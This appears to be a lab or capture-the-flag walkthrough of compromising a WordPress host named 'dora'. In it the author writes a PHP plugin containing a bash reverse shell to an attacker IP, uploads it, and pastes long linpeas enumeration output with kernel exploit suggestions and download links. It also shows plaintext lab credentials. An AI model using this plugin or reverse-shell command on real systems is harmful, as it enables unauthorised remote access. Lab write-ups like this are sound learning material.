
Wordpress was not setup. So I made it myself.
Created a docker to be my db.
```
sudo docker run -p 192.168.49.76:3306:3306 --name wordpress-mysql -e MYSQL_ROOT_PASSWORD=Password123 MYSQL_DATABASE=wordpress -d mysql:latest
```

Created user.

```
admin
test@test.com
25aMJw)LxtzyiO)TaN
```

Created a wordpress reverse shell plugin.

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.49.76/80 0>&1'");
?>
```

Zipped it up and uploaded it.

I then got a reverse shell on port 80

```


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                             
    |---------------------------------------------------------------------------------|                             
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                             
    |         Follow on Twitter         :     @carlospolopm                           |                             
    |         Respect on HTB            :     SirBroccoli                             |                             
    |---------------------------------------------------------------------------------|                             
    |                                 Thank you!                                      |                             
    \---------------------------------------------------------------------------------/                             
          linpeas-ng by carlospolop                                                                                 
                                                                                                                    
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                  
                                                                                                                    
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                            
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                 
                               ╚═══════════════════╝                                                                
OS: Linux version 5.4.0-146-generic (buildd@lcy02-amd64-026) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: dora
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                 
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                      
                                                                                                                    
                                                                                                                    

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE
                                                                                                                    
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                  
                              ╚════════════════════╝                                                                
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                  
Linux version 5.4.0-146-generic (buildd@lcy02-amd64-026) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.6 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                     
Sudo version 1.8.31                                                                                                 

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560                                                                                         

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                             
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                              
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Tue Apr 11 04:01:46 UTC 2023                                                                                        
 04:01:46 up  1:34,  0 users,  load average: 0.22, 0.05, 0.02

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                
sda
sda1
sda2
sda3

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                           
/dev/disk/by-id/dm-uuid-LVM-tecYKmaJOxAR8IqDsJkFH4BbBCG9JBfXXe0klKu8L5QeChfq2ojdvU7zBtgAsvll / ext4 defaults 0 1    
/dev/disk/by-uuid/c1f1cf69-1d06-429c-8e83-732717012c4b /boot ext4 defaults 0 1
/swap.img       none    swap    sw      0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                             
HISTFILESIZE=0                                                                                                      
SHLVL=2
OLDPWD=/
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:24068
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=dd16130ff16c4116af8b784059912a71
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed              
dmesg Not Found                                                                                                     
                                                                                                                    
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                  
cat: write error: Broken pipe                                                                                       
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                             
                                                                                                                    
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                       
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                   
═╣ Execshield enabled? ............ Execshield Not Found                                                            
═╣ SELinux enabled? ............... sestatus Not Found                                                              
═╣ Seccomp enabled? ............... disabled                                                                        
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                    

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                 
                                   ╚═══════════╝                                                                    
╔══════════╣ Container related tools present
/snap/bin/lxc                                                                                                       
╔══════════╣ Am I Containered?
╔══════════╣ Container details                                                                                      
═╣ Is this a container? ........... No                                                                              
═╣ Any running containers? ........ No                                                                              
                                                                                                                    

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                 
                                     ╚═══════╝                                                                      
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS Lambda? .......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                  
                ╚════════════════════════════════════════════════╝                                                  
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                             
root         516  0.0  0.0   2488   560 ?        S    02:26   0:00  _ bpfilter_umh                                  
root           1  0.0  0.6 169356 12900 ?        Ss   02:26   0:01 /sbin/init maybe-ubiquity
root         487  0.0  1.1  50368 24152 ?        S<s  02:26   0:01 /lib/systemd/systemd-journald
root         563  0.0  0.3  22892  6324 ?        Ss   02:26   0:00 /lib/systemd/systemd-udevd
root         809  0.0  0.8 345816 18220 ?        SLsl 02:26   0:01 /sbin/multipathd -d -s
systemd+     850  0.0  0.3  90880  6148 ?        Ssl  02:26   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         860  0.0  0.5  47544 10484 ?        Ss   02:26   0:00 /usr/bin/VGAuthService
root         861  0.0  0.4 311536  8568 ?        Ssl  02:26   0:03 /usr/bin/vmtoolsd
systemd+     935  0.0  0.3  27372  7976 ?        Ss   02:26   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+     937  0.0  0.5  24412 12040 ?        Ss   02:26   0:00 /lib/systemd/systemd-resolved
root        1034  0.0  0.4 239280  9408 ?        Ssl  02:28   0:00 /usr/lib/accountsservice/accounts-daemon
root        1038  0.0  0.1   6816  3056 ?        Ss   02:28   0:00 /usr/sbin/cron -f
message+    1042  0.0  0.2   7680  4852 ?        Ss   02:28   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root        1052  0.0  0.1  81956  3712 ?        Ssl  02:28   0:00 /usr/sbin/irqbalance --foreground
root        1055  0.0  0.9  29668 18564 ?        Ss   02:28   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root        1060  0.0  0.4 236420  9080 ?        Ssl  02:28   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog      1061  0.0  0.2 224344  4900 ?        Ssl  02:28   0:00 /usr/sbin/rsyslogd -n -iNONE
root        1064  0.0  2.0 875300 41404 ?        Ssl  02:28   0:01 /usr/lib/snapd/snapd
root        1072  0.0  0.3  17224  7344 ?        Ss   02:28   0:00 /lib/systemd/systemd-logind
root        1075  0.0  0.6 395564 13744 ?        Ssl  02:28   0:00 /usr/lib/udisks2/udisksd
daemon[0m      1076  0.0  0.1   3796  2192 ?        Ss   02:28   0:00 /usr/sbin/atd -f
root        1094  0.0  0.0   5828  1844 tty1     Ss+  02:28   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root        1123  0.0  0.6 318820 13368 ?        Ssl  02:28   0:00 /usr/sbin/ModemManager
root        1125  0.0  1.0 107924 20704 ?        Ssl  02:28   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root        1131  0.0  0.9 194084 18652 ?        Ss   02:28   0:00 /usr/sbin/apache2 -k start
www-data    2222  0.0  2.0 197616 42320 ?        S    02:35   0:00  _ /usr/sbin/apache2 -k start
www-data    2974  0.0  1.9 197688 38716 ?        S    02:56   0:00  _ /usr/sbin/apache2 -k start
www-data    2975  0.0  2.0 198176 41028 ?        S    02:56   0:00  _ /usr/sbin/apache2 -k start
www-data    2977  0.0  2.2 198236 45212 ?        S    02:56   0:00  _ /usr/sbin/apache2 -k start
www-data    2978  0.0  2.0 197900 41700 ?        S    02:56   0:00  _ /usr/sbin/apache2 -k start
www-data    2979  0.0  2.1 199564 42820 ?        S    02:56   0:00  _ /usr/sbin/apache2 -k start
www-data    4609  0.0  0.0   2608   600 ?        S    03:56   0:00  |   _ sh -c /bin/bash -c 'bash -i >& /dev/tcp/192.168.49.76/80 0>&1'
www-data    4610  0.0  0.1   3976  2940 ?        S    03:56   0:00  |       _ /bin/bash -c bash -i >& /dev/tcp/192.168.49.76/80 0>&1
www-data    4611  0.0  0.1   4108  3488 ?        S    03:56   0:00  |           _ bash -i
www-data    4748  0.1  0.1   3760  2808 ?        S    04:01   0:00  |               _ /bin/sh ./linpeas.sh
www-data    7824  0.0  0.0   3760  1244 ?        S    04:01   0:00  |                   _ /bin/sh ./linpeas.sh
www-data    7828  0.0  0.1   6216  3356 ?        R    04:01   0:00  |                   |   _ ps fauxwww
www-data    7827  0.0  0.0   3760  1244 ?        S    04:01   0:00  |                   _ /bin/sh ./linpeas.sh
www-data    2980  0.0  2.1 199764 43552 ?        S    02:56   0:00  _ /usr/sbin/apache2 -k start
www-data    2981  0.0  2.1 198344 42980 ?        S    02:56   0:00  _ /usr/sbin/apache2 -k start
www-data    4067  0.0  2.0 197660 40788 ?        S    03:37   0:00  _ /usr/sbin/apache2 -k start
www-data    4244  0.0  1.8 197500 38444 ?        S    03:41   0:00  _ /usr/sbin/apache2 -k start
root        1440  0.0  1.4 384904 29368 ?        Ssl  02:29   0:00 /usr/libexec/fwupd/fwupd
root        1518  0.0  0.4 314928  9320 ?        Ssl  02:29   0:00 /usr/lib/upower/upowerd

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                        
                                                                                                                    
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                  
COMMAND    PID  TID TASKCMD               USER   FD      TYPE DEVICE SIZE/OFF  NODE NAME                            

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                  
gdm-password Not Found                                                                                              
gnome-keyring-daemon Not Found                                                                                      
lightdm Not Found                                                                                                   
vsftpd Not Found                                                                                                    
apache2 process found (dump creds from memory as root)                                                              
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                              
/usr/bin/crontab                                                                                                    
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab                                                            

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Apr  6 03:30 .
drwxr-xr-x 100 root root 4096 Apr  6 03:30 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  190 Aug 31  2022 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Apr  6 03:30 .
drwxr-xr-x 100 root root 4096 Apr  6 03:30 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  539 Feb 23  2021 apache2
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 Apr 25  2022 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Aug 31  2022 .
drwxr-xr-x 100 root root 4096 Apr  6 03:30 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Aug 31  2022 .
drwxr-xr-x 100 root root 4096 Apr  6 03:30 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Apr  6 03:29 .
drwxr-xr-x 100 root root 4096 Apr  6 03:30 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rwxr-xr-x   1 root root  403 Apr 25  2022 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                      
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                         

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                         
/etc/systemd/system/multi-user.target.wants/atd.service is executing some relative path                             
/etc/systemd/system/multi-user.target.wants/grub-common.service is executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                           
NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES                     
Tue 2023-04-11 04:09:00 UTC 7min left     Tue 2023-04-11 03:39:30 UTC 22min ago    phpsessionclean.timer        phpsessionclean.service       
Tue 2023-04-11 06:20:50 UTC 2h 18min left Tue 2023-04-11 02:29:07 UTC 1h 32min ago apt-daily-upgrade.timer      apt-daily-upgrade.service     
Tue 2023-04-11 09:31:15 UTC 5h 29min left Tue 2023-04-11 02:32:39 UTC 1h 29min ago ua-timer.timer               ua-timer.service              
Tue 2023-04-11 11:56:20 UTC 7h left       Tue 2023-04-11 02:29:07 UTC 1h 32min ago apt-daily.timer              apt-daily.service             
Tue 2023-04-11 15:34:46 UTC 11h left      Tue 2023-04-11 02:29:07 UTC 1h 32min ago fwupd-refresh.timer          fwupd-refresh.service         
Tue 2023-04-11 20:21:54 UTC 16h left      Tue 2023-04-11 02:29:07 UTC 1h 32min ago motd-news.timer              motd-news.service             
Wed 2023-04-12 00:00:00 UTC 19h left      Tue 2023-04-11 02:29:07 UTC 1h 32min ago logrotate.timer              logrotate.service             
Wed 2023-04-12 00:00:00 UTC 19h left      Tue 2023-04-11 02:29:07 UTC 1h 32min ago man-db.timer                 man-db.service                
Wed 2023-04-12 02:42:30 UTC 22h left      Tue 2023-04-11 02:42:30 UTC 1h 19min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2023-04-16 03:10:04 UTC 4 days left   Tue 2023-04-11 02:29:07 UTC 1h 32min ago e2scrub_all.timer            e2scrub_all.service           
Mon 2023-04-17 00:00:00 UTC 5 days left   Tue 2023-04-11 02:29:07 UTC 1h 32min ago fstrim.timer                 fstrim.service                
n/a                         n/a           n/a                         n/a          snapd.snap-repair.timer      snapd.snap-repair.service     

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                           
                                                                                                                    
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                          
/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd                                                                                              
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core20/1611/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd                                                                             
/snap/core20/1611/usr/lib/systemd/system/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd                                                                                                 
/snap/core20/1611/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                                 
/snap/core20/1611/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                            
/snap/core20/1611/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                           
/snap/core20/1611/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                    
/snap/core20/1611/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                    
/snap/core20/1611/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                                                                                   
/snap/core20/1611/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                
/snap/core20/1611/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                         
/snap/core20/1611/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                         
/snap/core20/1852/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd                                                                             
/snap/core20/1852/usr/lib/systemd/system/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd                                                                                                 
/snap/core20/1852/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                                 
/snap/core20/1852/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                            
/snap/core20/1852/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                           
/snap/core20/1852/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                    
/snap/core20/1852/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                    
/snap/core20/1852/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog                                                                                                                   
/snap/core20/1852/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                
/snap/core20/1852/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                         
/snap/core20/1852/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                         

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                          
/org/kernel/linux/storage/multipathd                                                                                
/run/dbus/system_bus_socket
  └─(Read Write)
/run/irqbalance//irqbalance1052.sock
  └─(Read )
/run/irqbalance/irqbalance1052.sock
  └─(Read )
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)
/var/snap/lxd/common/lxd/unix.socket

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                            
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                            
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
:1.0                              1 systemd         root             :1.0          init.scope                  -       -
:1.1                            935 systemd-network systemd-network  :1.1          systemd-networkd.service    -       -
:1.10                          1125 unattended-upgr root             :1.10         unattended-upgrades.service -       -
:1.11                          1064 snapd           root             :1.11         snapd.service               -       -
:1.14                          1440 fwupd           root             :1.14         fwupd.service               -       -
:1.15                          1518 upowerd         root             :1.15         upower.service              -       -
:1.2                            850 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service   -       -
:1.29                         10972 busctl          www-data         :1.29         apache2.service             -       -
:1.3                            937 systemd-resolve systemd-resolve  :1.3          systemd-resolved.service    -       -
:1.4                           1060 polkitd         root             :1.4          polkit.service              -       -
:1.5                           1034 accounts-daemon[0m root             :1.5          accounts-daemon.service     -       -
:1.6                           1075 udisksd         root             :1.6          udisks2.service             -       -
:1.7                           1072 systemd-logind  root             :1.7          systemd-logind.service      -       -
:1.8                           1123 ModemManager    root             :1.8          ModemManager.service        -       -
:1.9                           1055 networkd-dispat root             :1.9          networkd-dispatcher.service -       -
com.ubuntu.LanguageSelector       - -               -                (activatable) -                           -       -
com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
io.netplan.Netplan                - -               -                (activatable) -                           -       -
org.freedesktop.Accounts       1034 accounts-daemon[0m root             :1.5          accounts-daemon.service     -       -
